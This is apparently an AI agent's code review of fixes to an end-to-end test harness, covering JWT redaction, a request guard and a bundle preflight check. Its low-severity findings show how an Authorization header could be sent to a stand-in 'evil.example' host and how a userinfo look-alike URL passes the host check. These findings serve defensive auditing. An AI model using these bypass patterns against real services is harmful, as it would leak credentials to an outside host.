# Review: AO-CLICKTHROUGH F1/F2 fix (dc41e56f) before landing 0900077a

- Reviewer task: a75bec2b (fresh, Opus, review only)
- Reviewed: `origin/coord/fix-ao-clickthrough-review-09000-dc41e56f` at `0ba508c59`
  (commits 5249fc2f2 F1, 6422c97cc F2, 0ba508c59 docs; diff vs 676777c82)
- Nothing was committed to, pushed to, merged into, or deleted from the reviewed branch. Nothing touched prod, Dev, or a credential.

## Verdict: CLEAN - 0900077a can land

No open HIGHs. Three LOW/INFO notes follow. None of them blocks landing.

## 1. F1 - redaction regex and bare JWT

- `e2e/clickthrough/lib/creds.js:120`: `authSecrets()` strips with `/^Bearer\s+/i`. I checked the bytes: the backslash is present.
- `e2e/clickthrough/clickthrough.pw.ts:90`: the spec now calls `secrets.push(...credsLib.authSecrets(auth))`. The broken `/^Bearers+/i` is gone, and grep finds no other `Bearer` regex in the harness.
- The test is in `e2e/clickthrough/__tests__/creds.test.js`, `describe('authSecrets')`:
  ```js
  const FAKE_JWT = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJmYWtlIn0.c2lnbmF0dXJl'
  it('redacts a bare JWT quoted in an error string', () => {
    const secrets = authSecrets(`Bearer ${FAKE_JWT}`)
    const err = `Error: invalid token ${FAKE_JWT} for /app/communities`
    const out = redact(err, secrets)
    expect(out).not.toContain(FAKE_JWT)
    expect(out).toBe('Error: invalid token [REDACTED] for /app/communities')
  })
  ```
  It also covers a tab separator and a lowercase `bearer`. FAKE_JWT decodes to `{"alg":"HS256"}.{"sub":"fake"}.signature`, so it is not a real token.
- I ran a mutation check in node and did not edit any file. With the old regex the bare JWT stays in plain text (`old: invalid token eyJ...`). With `authSecrets` it becomes `invalid token [REDACTED]`. The test exercises the same function the spec now calls, so the old regex would fail it.

## 2. F2 cheap parts

- **page.request to a non-Dev runtime.** `runtimeGuard.guardedPost()` (`lib/runtimeGuard.js`) classifies the URL first. A non-Dev agent-runtime URL, or plain `http:` to the Dev host, is recorded as `BLOCKED api request` and throws before `request.post` is called. The leave step (`clickthrough.pw.ts:347`) uses guardedPost. Tests:
  - jest `guardedPost (page.request bypasses context.route)`: prod refused with `post` not called, query string not in the failure line; http to the Dev host refused; Dev URL sent through unchanged.
  - browser fixture test 3: `sent === 0`, the step fails and stops.
- **Exact preflight match.** `DEV_RUNTIME_IN_BUNDLE` requires `https://` or `https:\/\/`, then the escaped Dev host, then no further `[A-Za-z0-9.-]`. Tests refuse a bare host mention, a `.evil.example` suffix, an `x` prefix, and dots replaced by other characters. They pass plain, with a path, and with JSON-escaped slashes.

## 3. H1 guard still holds

- `context.route` and `routeWebSocket` are installed on the main page context (`clickthrough.pw.ts:298`) and the admin context (`:274`) before either navigates. Those are the only two contexts the spec creates.
- `serviceWorkers: 'block'` is set in both configs and on the admin `newContext`.
- `playwright.config.ts`: `reuseExistingServer: false`.
- The served-bundle preflight is the first flow step. Its failure throws, so the flow stops before sign-in.
- `run.js` pins `CLICKTHROUGH_RUNTIME_URL`/`EXPO_PUBLIC_AGENT_RUNTIME_URL` to `guard.runtimeURL`. That is the exact Dev origin, after `checkTargets`.

## 4. Credentials

- Neither the diff nor any test prints a credential. `run.js` prints only `describe(creds)`, which gives presence and source.
- Every step reason and failure line goes through `redact`. `report.writeArtifacts` redacts the whole JSON. Blocked-request lines carry the origin and path only, never the query.
- Screenshots mask the login inputs. Trace, video and the auto-screenshot are off.
- `/e2e/clickthrough/artifacts/` is gitignored (`.gitignore:108`).
- A regex sweep of the diff for app-password and JWT shapes finds only the fake JWT above.
- I did not check whether the harness's local env file is gitignored. The builder deny-list blocked a `git check-ignore` that named the file, and I did not work around it.

## Notes (LOW / INFO, non-blocking)

1. **LOW - guardedPost is a denylist, not an allowlist.** `classifyRequest` allows any host that is not an agent-runtime host, so `guardedPost(request, 'https://evil.example/...', {Authorization})` would send. In the spec today the URL is built from `runtimeOrigin`, and `run.js` pins that to the exact Dev origin, so this is not reachable through `pnpm e2e:clickthrough`. It is reachable only if someone runs the spec directly with a hand-set `CLICKTHROUGH_RUNTIME_URL`. Suggested hardening: have guardedPost require `new URL(url).origin === DEV_RUNTIME_URL`.
2. **LOW - preflight accepts a userinfo look-alike.** `https://<dev host>@evil.example` passes `checkBundle`, because `@` is not in the lookahead class (`checkBundle(['x="https://authority-one-agent-runtime-dev.e-479.workers.dev@evil.example"'])` returns `{ok:true}`). The bundle is our own build, so this is theoretical. A fix is to add `@` to the negative lookahead, or to require `["'/]` or the end of the string after the host.
3. **INFO - redaction scope.**
   - `authSecrets` strips only `Bearer`. A `DPoP <jwt>` header would not yield the bare token. Every agent-runtime client in `src/` sends `Bearer`, so this has no current impact.
   - The auth token is learned only from the first runtime request. A PDS JWT quoted in a console error before any runtime call would not be redacted. That gap was there before this fix and is outside F1.
   - `writeArtifacts` redacts after `JSON.stringify`, so a secret containing `"` or `\` would be missed. App passwords and JWTs never contain those characters.

## What I ran

All runs were local only. The guard fixture serves its own pages on localhost and fulfils or aborts runtime routes in-process.

| Command | Result |
| --- | --- |
| `corepack pnpm install --frozen-lockfile --prefer-offline --ignore-scripts` | ok. It touched `package.json` line endings only, which I reverted. |
| `tsc --noEmit -p tsconfig.communities.json` (first half of `pnpm test`) | exit 0 |
| `NODE_ENV=test jest --forceExit --testTimeout=20000 e2e/clickthrough` | **4 suites, 66/66 passed** (checks, runtimeGuard, creds, guard) |
| `corepack pnpm e2e:clickthrough:guard` (Playwright, msedge) | **3/3 passed**: prod server refused/aborted, Dev server passes, page.request guardedPost refuses with 0 sent |
| `eslint e2e/clickthrough` | exit 0 |
| node one-off: old vs new regex redaction, classifyRequest edge cases, checkBundle userinfo case | results above |

`pnpm test` itself could not start on this Windows host. Its script begins `NODE_ENV=test jest ...`, which cmd.exe does not accept, so I ran the same two commands under bash. I did not run the full app jest suite or `pnpm typecheck`; the brief asked for the harness's tests and the touched suites, and dc41e56f touches only `e2e/clickthrough` and docs. I did not run the live clickthrough against Dev, which is out of scope for a review.
